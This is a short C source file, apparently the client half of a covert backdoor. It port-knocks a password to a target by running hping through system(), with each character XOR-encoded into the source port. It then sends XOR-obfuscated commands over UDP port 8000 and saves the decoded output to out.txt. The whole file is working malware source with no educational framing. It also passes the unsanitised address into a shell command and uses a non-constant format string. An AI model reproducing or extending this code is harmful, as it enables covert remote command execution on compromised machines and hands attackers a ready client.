#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>

void send_password(const char *password, const char *dst_addr);
int connect_to_backdoor(char *command, const char *dst_addr);

//Executes client functions
int execute_client(const char *password, const char *dst_addr, char *command)
{
	
	send_password(password, dst_addr);
	connect_to_backdoor(command, dst_addr);
	return 0;
}

//Authenticates with server
void send_password(const char *password, const char *dst_addr)
{
	int i;
	char bash[100];
	int out ;
	for(i = 0; i < strlen(password); i++)
	{
		out = ((int)password[i]) ^ 1080;
		sprintf(bash, "hping %s -s %d -c 1",  dst_addr, out);
		printf("%s\n", bash);
		system(bash);
	}
}

//Connects to server
//Sends command to server
//Receives data from server
int connect_to_backdoor(char *command, const char *dst_addr)
{
	FILE *file;
	int sockfd,n;
	int i;
	struct sockaddr_in servaddr;
	char recvline[1000];
	char *decrypted, *encrypted = malloc(strlen(command) + 1);
	
	sockfd=socket(AF_INET,SOCK_DGRAM,0);

	bzero(&servaddr,sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr=inet_addr(dst_addr);
	servaddr.sin_port=htons(8000);

    for(i = 0; i < strlen(command); i++)
        encrypted[i] = command[i] ^ 2;
    encrypted[strlen(command)] = '\0';
	sendto(sockfd,encrypted,strlen(encrypted),0, (struct sockaddr *)&servaddr,sizeof(servaddr));
	file = fopen("out.txt", "w");
	while((n=recvfrom(sockfd,recvline,1000,0,NULL,NULL)) != 0)
	{
		decrypted = malloc(n + 1);
		for(i = 0; i < n; i++)
		{
			decrypted[i] = recvline[i] ^ 2;
			if(decrypted[i] == '0')
				decrypted[i] = ' ';
		}
		decrypted[n] = '\0';
		fprintf(file, decrypted);
		fflush(file);
	}
	fclose(file);
	
  
	return 0;
}
